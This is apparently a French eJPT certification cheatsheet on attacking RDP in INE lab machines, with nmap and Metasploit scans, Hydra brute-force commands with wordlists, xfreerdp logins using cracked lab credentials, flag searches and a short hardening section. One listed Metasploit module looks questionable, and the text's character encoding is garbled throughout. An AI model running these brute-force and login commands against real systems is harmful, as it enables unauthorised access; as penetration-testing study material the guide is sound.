# üñ•Ô∏è Insecure RDP Service Exploitation - Cheatsheet eJPT

## üéØ 1. Vue d'ensemble RDP ins√©curis√©

### Qu'est-ce que RDP ?
**RDP** (Remote Desktop Protocol) est un protocole Microsoft qui permet :
- üñ•Ô∏è **Acc√®s GUI complet** √† distance
- üîê **Authentification** par username/password
- üìä **Session interactive** Windows
- üéÆ **Contr√¥le total** du bureau distant
- üìÅ **Partage de fichiers** et ressources

### Vuln√©rabilit√©s RDP communes
- ‚úÖ **Ports non-standards** (3333, 3389, 13389)
- ‚úÖ **Credentials faibles** ou par d√©faut
- ‚úÖ **Pas de verrouillage** de compte
- ‚úÖ **Brute force** non d√©tect√©/bloqu√©
- ‚úÖ **Versions vuln√©rables** (BlueKeep, etc.)
- ‚úÖ **Configuration** mal s√©curis√©e

### Diff√©rences port RDP
| Port | Usage | Fr√©quence |
|------|--------|-----------|
| **3389** | Port RDP par d√©faut | Standard |
| **3333** | Port RDP alternatif | Fr√©quent eJPT |
| **13389** | Port RDP personnalis√© | Occasionnel |
| **33389** | Port RDP masqu√© | Rare |

---

## üîç 2. Reconnaissance RDP

### Scan de d√©couverte initial
```bash
# Test de connectivit√©
ping -c 4 demo.ine.local

# Scan de ports basique
nmap demo.ine.local
nmap -p3389,3333,13389 demo.ine.local

# Scan avec d√©tection de version
nmap -sV demo.ine.local
nmap -sV -p3333 demo.ine.local
```

### Identification service RDP
```bash
# Scripts Nmap RDP
nmap -p3333 --script rdp-* demo.ine.local
nmap -p3333 --script rdp-enum-encryption demo.ine.local
nmap -p3333 --script rdp-ntlm-info demo.ine.local

# Banner grabbing RDP
nc demo.ine.local 3333
telnet demo.ine.local 3333
```

### Scanner RDP avec Metasploit
```bash
# Lancement Metasploit
msfconsole

# Module de d√©tection RDP
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS demo.ine.local
set RPORT 3333
show options
exploit
```

### R√©sultat scanner RDP typique
```bash
# Sortie attendue :
[*] 192.168.1.100:3333 - Detected RDP on demo.ine.local:3333
[*] 192.168.1.100:3333 - RDP Target OS: Windows
[*] 192.168.1.100:3333 - RDP Protocol Version: 10.0
```

---

## üîê 3. Brute Force RDP avec Hydra

### Syntaxe Hydra pour RDP
```bash
hydra [OPTIONS] rdp://target[:port]
```

### Configuration Hydra RDP
```bash
# Brute force avec wordlists MSF
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      rdp://demo.ine.local -s 3333

# Options recommand√©es RDP
hydra -L users.txt -P passwords.txt -t 4 -f rdp://demo.ine.local -s 3333
```

### Options importantes Hydra RDP
| Option | Description | Valeur recommand√©e |
|--------|-------------|-------------------|
| `-L <file>` | Liste d'utilisateurs | common_users.txt |
| `-P <file>` | Liste de mots de passe | unix_passwords.txt |
| `-t <threads>` | Threads (IMPORTANT) | 4 max pour RDP |
| `-f` | Arr√™ter apr√®s succ√®s | Recommand√© |
| `-s <port>` | Port personnalis√© | 3333 |
| `-v` | Mode verbose | Optionnel |
| `-V` | Tr√®s verbose | Pour debug |

### ‚ö†Ô∏è Limitations critiques RDP
```bash
# JAMAIS plus de 4 threads pour RDP
hydra -L users.txt -P passwords.txt -t 4 rdp://target

# Avec d√©lai si probl√®mes de connexion
hydra -L users.txt -P passwords.txt -t 2 -w 5 rdp://target

# Mode tr√®s prudent
hydra -L users.txt -P passwords.txt -t 1 -w 10 rdp://target
```

### Wordlists sp√©cialis√©es RDP
```bash
# Wordlists Metasploit (recommand√©es eJPT)
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/common_passwords.txt

# Wordlists syst√®me
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
```

### Interpr√©tation r√©sultats Hydra
```bash
# R√©sultats typiques attendus :
[3333][rdp] host: demo.ine.local   login: administrator   password: qwertyuiop
[3333][rdp] host: demo.ine.local   login: guest   password: 
[3333][rdp] host: demo.ine.local   login: user   password: password
[3333][rdp] host: demo.ine.local   login: backup   password: backup123

# Format : [PORT][SERVICE] host: TARGET login: USER password: PASS
```

---

## üñ•Ô∏è 4. Connexion RDP apr√®s brute force

### Connexion avec xfreerdp (Recommand√©)
```bash
# Connexion de base
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333

# Avec options compl√®tes
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /cert-ignore +clipboard

# R√©solution personnalis√©e
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /size:1024x768

# Mode plein √©cran
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /f
```

### Options xfreerdp importantes
| Option | Description | Usage |
|--------|-------------|-------|
| `/u:username` | Nom d'utilisateur | `/u:administrator` |
| `/p:password` | Mot de passe | `/p:qwertyuiop` |
| `/v:target:port` | Cible et port | `/v:demo.ine.local:3333` |
| `/cert-ignore` | Ignorer certificats | Recommand√© labs |
| `+clipboard` | Partage presse-papier | Pratique |
| `/size:WxH` | R√©solution | `/size:1280x720` |
| `/f` | Plein √©cran | Pour immersion |
| `/drive:name,path` | Partage r√©pertoire | `/drive:share,/tmp` |

### Connexion avec rdesktop (Alternative)
```bash
# Connexion basique rdesktop
rdesktop -u administrator -p qwertyuiop demo.ine.local:3333

# Avec options
rdesktop -u administrator -p qwertyuiop -f demo.ine.local:3333
rdesktop -u administrator -p qwertyuiop -g 1024x768 demo.ine.local:3333
```

### Gestion des certificats RDP
```bash
# Si erreur de certificat
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /cert-ignore

# Accepter certificats automatiquement
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /cert:ignore

# Mode compatible
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /sec:rdp
```

---

## üîç 5. Post-exploitation RDP

### Navigation GUI Windows
```bash
# Actions dans l'interface RDP :
# 1. Clic droit sur "Computer" ou "This PC"
# 2. Naviguer vers C:\
# 3. Chercher fichiers flag
# 4. Double-clic pour ouvrir fichiers
```

### Recherche de flag via GUI
```bash
# M√©thodes GUI pour trouver flag :
# 1. My Computer ‚Üí C:\ ‚Üí flag.txt
# 2. Windows Explorer ‚Üí C:\ ‚Üí flag
# 3. Recherche Windows : "flag"
# 4. Command Prompt : dir C:\ /s | findstr flag
```

### Commandes dans RDP (via cmd)
```cmd
# Ouvrir Command Prompt
Windows+R ‚Üí cmd ‚Üí Enter

# Navigation et recherche
cd C:\
dir
dir /s | findstr flag
type flag.txt
type flag

# Informations syst√®me
whoami
hostname
systeminfo
ipconfig
```

### Transfert de fichiers via RDP
```bash
# Avec partage de r√©pertoire
xfreerdp /u:administrator /p:password /v:target:3333 /drive:share,/tmp

# Dans Windows RDP :
# \\tsclient\share\ ‚Üí Acc√®s aux fichiers Kali
# Copier flag vers \\tsclient\share\
```

---

## ‚ö° 6. Brute Force RDP avec Metasploit

### Module rdp_login (Alternative Hydra)
```bash
# Module Metasploit pour brute force RDP
use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/admin/rdp/rdp_multiuser_login

# Configuration (si disponible)
set RHOSTS demo.ine.local
set RPORT 3333
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```

### Comparaison Hydra vs Metasploit RDP
| Aspect | Hydra | Metasploit |
|--------|-------|------------|
| **Vitesse** | Plus rapide | Plus lent |
| **Stabilit√©** | Tr√®s stable | Moyennement stable |
| **Fonctionnalit√©s** | Brute force uniquement | Modules compl√©mentaires |
| **Usage eJPT** | Recommand√© | Alternatif |

---

## üõ°Ô∏è 7. D√©tection et s√©curisation RDP

### Logs Windows RDP
```powershell
# √âv√©nements RDP √† surveiller
# Event ID 4624: Successful logon (Type 10 - RemoteInteractive)
# Event ID 4625: Failed logon
# Event ID 4634: Account logoff
# Event ID 21: Remote Desktop Services - Session logon succeeded

Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4625}
Get-EventLog -LogName System | Where-Object {$_.Source -like "*TermService*"}
```

### D√©tection brute force RDP
```bash
# Signes de brute force RDP :
# - Multiples Event ID 4625 (√©checs de connexion)
# - Connexions depuis IPs externes r√©p√©t√©es
# - Tentatives utilisateurs inexistants
# - Pics de connexions RDP
```

### S√©curisation RDP
```cmd
# Changer port RDP (Registry)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v PortNumber /t REG_DWORD /d 13389

# Activer authentification au niveau r√©seau
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1

# Limiter utilisateurs RDP
net localgroup "Remote Desktop Users" /add username
```

---

## üéØ 8. Cas d'usage sp√©cifiques eJPT

### Sc√©nario 1: RDP port non-standard
```bash
# 1. D√©couverte port RDP alternatif
nmap -sV demo.ine.local
# Port 3333 trouv√© avec service inconnu

# 2. Identification RDP
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS demo.ine.local
set RPORT 3333
exploit

# 3. Brute force credentials
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      rdp://demo.ine.local -s 3333

# 4. Connexion RDP
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /cert-ignore

# 5. Recherche flag via GUI
# My Computer ‚Üí C:\ ‚Üí flag.txt
```

### Sc√©nario 2: Multiples credentials RDP
```bash
# Si plusieurs credentials trouv√©s
# administrator:qwertyuiop
# guest:(vide)
# user:password
# backup:backup123

# Tester chaque compte
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
xfreerdp /u:guest /p: /v:demo.ine.local:3333
xfreerdp /u:user /p:password /v:demo.ine.local:3333

# Choisir compte avec plus de privil√®ges (Administrator)
```

### Sc√©nario 3: RDP + transfert de fichiers
```bash
# 1. Connexion avec partage
xfreerdp /u:administrator /p:password /v:target:3333 /drive:kali,/tmp

# 2. Dans Windows RDP
# Aller √† \\tsclient\kali\
# Copier tools depuis Kali vers Windows

# 3. Ex√©cuter tools sur Windows pour enum/exploit local
```

---

## üí° 9. Conseils et astuces eJPT

### Points critiques RDP eJPT
- ‚úÖ **Ports non-standards** tr√®s fr√©quents (3333, 13389)
- ‚úÖ **Hydra avec wordlists MSF** tr√®s efficace
- ‚úÖ **Maximum 4 threads** pour RDP (crucial)
- ‚úÖ **xfreerdp plus stable** que rdesktop
- ‚úÖ **Flags souvent en C:\\** racine
- ‚úÖ **Attendre 30-40s** apr√®s brute force avant connexion

### Erreurs courantes √† √©viter
- ‚ùå **Trop de threads Hydra** ‚Üí Blocage service RDP
- ‚ùå **Ne pas tester ports alternatifs** RDP
- ‚ùå **Oublier /cert-ignore** ‚Üí √âchec connexion
- ‚ùå **Brute force trop agressif** ‚Üí D√©tection/blocage
- ‚ùå **Ne pas attendre** apr√®s brute force

### Optimisations eJPT
```bash
# Configuration Hydra optimale eJPT
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      -t 4 -f -v rdp://demo.ine.local -s 3333

# Connexion xfreerdp optimale
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /cert-ignore +clipboard /size:1024x768
```

### Workflow timing eJPT
```bash
# 1. D√©couverte (1-2 min)
nmap -sV demo.ine.local

# 2. Identification RDP (30s)
use auxiliary/scanner/rdp/rdp_scanner; set RPORT 3333; exploit

# 3. Brute force (2-3 min)
hydra -L common_users.txt -P unix_passwords.txt rdp://demo.ine.local -s 3333

# 4. ATTENDRE 30-40 secondes (important!)

# 5. Connexion RDP (30s)
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /cert-ignore

# 6. Recherche flag (1 min)
# GUI : My Computer ‚Üí C:\ ‚Üí flag.txt
```

### Ports RDP alternatifs fr√©quents eJPT
```bash
# Ports √† scanner syst√©matiquement
3389    # Port RDP standard
3333    # Tr√®s fr√©quent dans eJPT
13389   # Alternative courante  
33389   # Moins fr√©quent
3390    # Proche du standard
8080    # Parfois utilis√©
```

---

## üìã 10. Checklist exploitation RDP

### ‚úÖ Phase de reconnaissance
- [ ] **Connectivit√© cible** test√©e (ping)
- [ ] **Ports ouverts** identifi√©s (nmap)
- [ ] **Service RDP** confirm√© sur port alternatif
- [ ] **Module scanner RDP** utilis√©

### ‚úÖ Phase de brute force
- [ ] **Wordlists MSF** s√©lectionn√©es
- [ ] **Threads limit√©s** √† 4 maximum
- [ ] **Port personnalis√©** sp√©cifi√© (-s 3333)
- [ ] **Credentials valides** trouv√©s et not√©s
- [ ] **Attente 30-40s** apr√®s brute force

### ‚úÖ Phase de connexion
- [ ] **xfreerdp** utilis√© avec options correctes
- [ ] **Certificats ignor√©s** (/cert-ignore)
- [ ] **Connexion RDP** √©tablie avec succ√®s
- [ ] **Session GUI** Windows fonctionnelle

### ‚úÖ Phase post-exploitation
- [ ] **Navigation GUI** ma√Ætris√©e
- [ ] **R√©pertoire C:\\** explor√©
- [ ] **Flag localis√©** et lu
- [ ] **Contenu flag** document√©

### üìù Informations √† documenter
- **Port RDP d√©couvert** : 3333
- **Credentials trouv√©s** : administrator:qwertyuiop
- **M√©thode connexion** : xfreerdp
- **Localisation flag** : C:\flag.txt
- **Contenu flag** : port-number-3333

**üéØ Conseil final eJPT :** L'exploitation RDP ins√©curis√© est **tr√®s courante** dans l'eJPT avec des ports alternatifs (3333). Pattern : d√©couverte ‚Üí identification RDP ‚Üí brute force Hydra (MAX 4 threads!) ‚Üí attendre 30s ‚Üí xfreerdp ‚Üí GUI navigation ‚Üí flag. Les credentials faibles sont la norme dans les labs !